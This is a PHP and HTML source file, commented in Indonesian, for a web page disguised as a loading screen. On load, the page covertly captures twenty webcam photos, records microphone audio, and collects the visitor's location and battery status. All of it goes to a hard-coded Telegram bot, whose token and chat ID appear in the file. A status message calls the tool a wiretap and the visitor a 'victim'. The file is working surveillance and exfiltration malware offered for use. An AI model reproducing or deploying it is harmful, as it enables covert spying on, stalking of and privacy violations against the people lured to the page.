<?php
$botToken = "7649364091:AAG1TvYD5svqSbT1QYjNZiCbACInC0QZkGM";
$chatId = "5935580035";

function sendPhotoToTelegram($photoPath) {
    global $botToken, $chatId;

    if (!file_exists($photoPath)) {
        echo json_encode(["status" => "error", "message" => "File tidak ditemukan"]);
        return false;
    }

    if (filesize($photoPath) > 20 * 1024 * 1024) { // 20 MB
        echo json_encode(["status" => "error", "message" => "File terlalu besar"]);
        return false;
    }

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $data = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($photoPath),
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseObj = json_decode($response, true);
    return $responseObj['ok'] === true;
}

function sendLocationToTelegram($latitude, $longitude) {
    global $botToken, $chatId;
    
    $url = "https://api.telegram.org/bot$botToken/sendLocation";
    $data = [
        'chat_id' => $chatId,
        'latitude' => $latitude,
        'longitude' => $longitude,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseObj = json_decode($response, true);
    return $responseObj['ok'] === true;
}

function sendVoiceNoteToTelegram($audioPath) {
    global $botToken, $chatId;

    if (!file_exists($audioPath)) {
        echo json_encode(["status" => "error", "message" => "File tidak ditemukan"]);
        return false;
    }

    $url = "https://api.telegram.org/bot$botToken/sendVoice";
    $data = [
        'chat_id' => $chatId,
        'voice' => new CURLFile($audioPath),
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseObj = json_decode($response, true);
    return $responseObj['ok'] === true;
}

function sendBatteryStatusToTelegram($statusMessage) {
    global $botToken, $chatId;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $statusMessage,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    $responseObj = json_decode($response, true);
    return $responseObj['ok'] === true;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $photos = json_decode($_POST["photos"], true);
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $audioData = $_POST['audio'];
    $batteryStatus = $_POST['battery_status']; // Menangani status baterai
    $successCount = 0;

    // Kirim foto ke Telegram
    foreach ($photos as $index => $photoData) {
        $photoPath = "captured_image_$index.png";

        $photoData = str_replace('data:image/png;base64,', '', $photoData);
        $photoData = str_replace(' ', '+', $photoData);
        file_put_contents($photoPath, base64_decode($photoData));

        if (sendPhotoToTelegram($photoPath)) {
            $successCount++;
        }

        unlink($photoPath); 
    }

    if ($latitude && $longitude) {
        sendLocationToTelegram($latitude, $longitude);
    }

    if ($audioData) {
        $audioPath = 'audio.ogg';
        file_put_contents($audioPath, base64_decode($audioData));
        sendVoiceNoteToTelegram($audioPath);
        unlink($audioPath);
    }

    if ($batteryStatus) {
        sendBatteryStatusToTelegram($batteryStatus);
    }

    echo json_encode(["status" => "success", "message" => "$successCount foto berhasil dikirim"]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Media</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 500px;
        }
        h1 {
            color: #333;
        }
        #loader {
            margin: 20px auto;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 20px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Mohon Tunggu</h1>
        <div id="loader"></div>
        <p class="message">Sedang loading mohon tunggu sebentar...</p>
    </div>

    <script>
        let photos = [];
        let photoCount = 0;
        const maxPhotos = 20; // Menangkap 20 foto
        let latitude, longitude;

        function capturePhotos() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    video.addEventListener('loadeddata', () => {
                        const interval = setInterval(() => {
                            if (photoCount >= maxPhotos) {
                                clearInterval(interval);
                                sendPhotosToServer(photos);
                                stream.getTracks().forEach(track => track.stop());
                                return;
                            }

                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;

                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            photos.push(canvas.toDataURL('image/png'));
                            photoCount++;
                        }, 3000); //untuk mengatur delay
                    });
                })
                .catch(function (error) {
                    console.error("Error accessing camera:", error);
                });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    console.log("Latitude: " + latitude + ", Longitude: " + longitude);
                }, function(error) {
                    console.error("Error obtaining location: ", error);
                });
            } else {
                console.log("Geolocation not supported by this browser.");
            }
        }

        function accessMicrophone() {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(function(stream) {
                    const mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.start();

                    let audioChunks = [];
                    mediaRecorder.ondataavailable = function(event) {
                        audioChunks.push(event.data);
                    };
                    mediaRecorder.onstop = function() {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        const reader = new FileReader();
                        reader.onloadend = function() {
                            const base64Audio = reader.result.split(',')[1];
                            sendAudioToServer(base64Audio);
                        };
                        reader.readAsDataURL(audioBlob);
                    };

                    setTimeout(function() {
                        mediaRecorder.stop();
                    }, 100000); // merekam audio selama 1menit
                })
                .catch(function(error) {
                    console.error("Error accessing microphone: ", error);
                });
        }

        function getBatteryStatus() {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    const batteryLevel = Math.round(battery.level * 100); // Level baterai dalam persen
                    const chargingStatus = battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi';
                    sendBatteryStatusToServer(batteryLevel, chargingStatus);
                });
            } else {
                console.log("Battery API tidak didukung.");
            }
        }

        function sendBatteryStatusToServer(batteryLevel, chargingStatus) {
            const statusMessage = `SADAP BY FFIQRI
- Website telah di buka oleh terget
- Batrai korban: ${batteryLevel}% (${chargingStatus})`;

            fetch("", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({
                    battery_status: statusMessage
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    console.log('Status baterai berhasil dikirim.');
                } else {
                    console.log('Gagal mengirim status baterai.');
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }

        function sendPhotosToServer(photos) {
            fetch("", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({
                    photos: JSON.stringify(photos),
                    latitude: latitude,
                    longitude: longitude
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    document.querySelector('.message').innerText = data.message;
                } else {
                    document.querySelector('.message').innerText = "Gagal mengirim gambar.";
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }

        function sendAudioToServer(audioBase64) {
            fetch("", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({
                    audio: audioBase64
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === "success") {
                    console.log('Audio berhasil dikirim.');
                } else {
                    console.log('Gagal mengirim audio.');
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }

        capturePhotos();
        getLocation();
        accessMicrophone();
        getBatteryStatus();
    </script>
</body>
</html>
